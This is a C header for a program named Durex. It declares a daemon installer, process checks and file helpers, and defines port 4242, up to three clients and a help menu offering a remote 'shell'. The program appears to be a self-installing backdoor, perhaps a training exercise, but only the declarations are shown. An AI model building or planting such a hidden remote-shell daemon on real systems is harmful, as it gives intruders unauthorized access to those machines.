#ifndef DUREX_H
# define DUREX_H

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <pwd.h>

# define BOOLEAN int

typedef enum		e_bool
{
	true = 1,
	false = 0
}					t_bool;

#define PORT       4242
#define MAX 3

#define HELP "Durex v1.0: Available command:\nhelp\nshell\nquit\n"

typedef struct	s_client {
	int pid;
	int socket;
}				t_client;

/*
** UTILS
*/
char			*ft_strnew(size_t size);
BOOLEAN			file_exists(const char *filename);
BOOLEAN			is_directory(const char *filename);
char			*file_get_contents(const char *filename);
size_t			file_get_contents_size(char **content, const char *filename);
BOOLEAN			file_put_contents(const char *filename, const char *content);
BOOLEAN			file_put_contents_size(const char *filename, const char *content, size_t size);
size_t			array_length(char **array);
void			free_array(char **array);
char			*file_base_name(const char *file_path);
char			*file_absolute_path(const char *file_path);
char			**ft_split_string(char const *s, char *c);
char			*ft_dstrjoin(char *s1, char *s2, short flag);

int				main(int argc, char **argv);
int				durex(int argc, char **argv);
void			daemon_install(void);
BOOLEAN			processes_exists(char **names);
int				processes_exists_pid(char **names);

#endif
